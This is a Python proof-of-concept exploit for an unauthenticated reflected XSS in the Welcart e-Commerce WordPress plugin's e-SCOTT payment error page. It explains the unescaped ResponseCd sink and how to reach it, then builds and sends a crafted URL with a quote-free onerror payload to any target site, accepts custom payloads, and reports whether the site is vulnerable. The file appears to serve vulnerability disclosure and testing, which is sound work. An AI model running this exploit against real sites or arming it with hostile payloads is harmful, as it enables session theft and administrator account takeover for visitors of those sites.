#!/usr/bin/env python3
"""
Welcart e-Commerce (usc-e-shop) <= 2.12.5 - Unauthenticated Reflected XSS
=========================================================================

Vulnerability
-------------
classes/paymentESCOTT.main.class.php  ::  ESCOTT_MAIN::error_page_message()

    $html .= '<p>' . __( 'Error code', 'usces' ) . ' : '
           . wp_unslash( $_REQUEST['ResponseCd'] ) . '</p>';

$_REQUEST['ResponseCd'] is passed through wp_unslash() (which strips the
slashes WordPress's wp_magic_quotes() applied) and concatenated into the
cart error-page HTML with no escaping. The value is ultimately rendered by
the cart template via the `the_content` filter (filter_cartContent ->
templates/cart/error.php -> uesces_get_error_settlement()).

Why it works
------------
1. wp_unslash() defeats WordPress's built-in magic quotes, so the raw value
   reaches the page. (This is what made the image-map-hotspots SQLi a false
   positive - there the quotes stayed escaped and the injection failed.)
2. The payload is quote-free (<img ... onerror=...>), so it needs no
   `'`/`"` at all - immune to escaping-by-addslashes regardless.
3. Reachability is unauthenticated: a plain GET to the Welcart cart page
   with acting_return=1 drives usceshop::acting_return() into the
   `page = 'error'` branch (usces_check_acting_return() default case sets
   $results[0] = 0 when no `result` param is supplied).

Conditions / scope
------------------
* The "e-SCOTT Smart" (ESCOTT) settlement must be activated
  (acting_settings.escott.activate == 'on' and conv_activate == 'on',
  and 'escott' present in usces_settlement_selected) - i.e. sites actually
  using the e-SCOTT gateway.
* MerchantFree2=acting_escott_conv selects the vulnerable elseif branch.
* The server-to-server acting_notice_ip_guard() (which die()s on
  non-e-SCOTT IPs) is never triggered here: it only fires when the full
  notification parameter set (MerchantId/TransactionId/RecvNum/NyukinDate/
  MerchantFree1) is present, and it is not called on the browser-return path.
* No authentication / capability / nonce is required.

Impact
------
Attacker-controlled JavaScript executes in the site's origin for any visitor
who opens a crafted link - session/cookie theft, admin ATO (if an admin
clicks), defacement, keylogging.

Usage
-----
    python3 welcart_escott_xss_poc.py [base_url] [options]

Examples
--------
    python3 welcart_escott_xss_poc.py http://wordpress.local
    python3 welcart_escott_xss_poc.py https://target.example --cart /cart/
    python3 welcart_escott_xss_poc.py https://target.example --payload '<svg/onload=alert(1)>'
    python3 welcart_escott_xss_poc.py https://target.example --quiet   # exit code only
"""

import argparse
import sys
import urllib.parse
import urllib.request

DEFAULT_PAYLOAD = '<img src=x onerror=alert(document.domain)>'


def build_url(base: str, cart_path: str, payload: str) -> str:
    base = base.rstrip("/")
    if not cart_path.startswith("/"):
        cart_path = "/" + cart_path
    if not cart_path.endswith("/") and "." not in cart_path.rsplit("/", 1)[-1]:
        cart_path += "/"
    qs = urllib.parse.urlencode(
        {
            # triggers usceshop::acting_return() -> page = 'error'
            "acting_return": "1",
            # selects the vulnerable elseif branch in error_page_message()
            "MerchantFree2": "acting_escott_conv",
            # the unescaped sink
            "ResponseCd": payload,
        }
    )
    return f"{base}{cart_path}?{qs}"


def fetch(url: str, timeout: int = 15) -> tuple[int, str]:
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "welcart-xss-poc/1.0",
            "Accept": "text/html,application/xhtml+xml",
        },
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Welcart e-Commerce / e-SCOTT unauthenticated reflected XSS PoC"
    )
    ap.add_argument("base", nargs="?", default="http://wordpress.local",
                    help="Site base URL (default: http://wordpress.local)")
    ap.add_argument("--cart", default="/usces-cart/",
                    help="Welcart cart page path (default: /usces-cart/)")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD,
                    help="Raw (quote-free) XSS payload injected as ResponseCd")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--quiet", action="store_true",
                    help="No output; exit 0 if vulnerable, 1 otherwise")
    args = ap.parse_args()

    url = build_url(args.base, args.cart, args.payload)
    try:
        status, body = fetch(url, args.timeout)
    except Exception as exc:  # network / HTTP error
        if not args.quiet:
            print(f"[!] request failed: {exc}")
        return 2

    # The payload must appear RAW (executable) and never escaped.
    raw_present = args.payload in body
    escaped_present = (
        args.payload.replace("<", "&lt;") in body
        or args.payload.replace("<", "&lt;").replace(">", "&gt;") in body
    )
    on_error_block = 'error_code_reflection_marker' in body  # not used, kept simple
    reached_error_page = "error-page" in body or "Error code" in body

    vulnerable = bool(status == 200 and raw_present and not escaped_present)

    if not args.quiet:
        print("=" * 68)
        print("Welcart e-Commerce (usc-e-shop) - e-SCOTT Reflected XSS PoC")
        print("=" * 68)
        print(f"[+] URL        : {url}")
        print(f"[+] HTTP status: {status}")
        print(f"[+] Error page : {'yes' if reached_error_page else 'no'}")
        print(f"[+] Raw payload in response      : {'YES' if raw_present else 'no'}")
        print(f"[+] HTML-escaped payload present : {'YES (blocked)' if escaped_present else 'no'}")
        if raw_present:
            i = body.find(args.payload)
            print("[+] Context    : ..." + body[max(0, i - 60):i + len(args.payload) + 10].replace("\n", " ") + "...")
        print("-" * 68)
        print("[*] Reflected unescaped (browser executes onerror/onload): "
              + ("CONFIRMED - XSS" if vulnerable else "not confirmed"))
        if vulnerable:
            print("[*] Impact: arbitrary JS in site origin (session theft / admin ATO).")
            print("[*] Note  : requires e-SCOTT Smart settlement activated on target.")
        print("=" * 68)

    return 0 if vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())
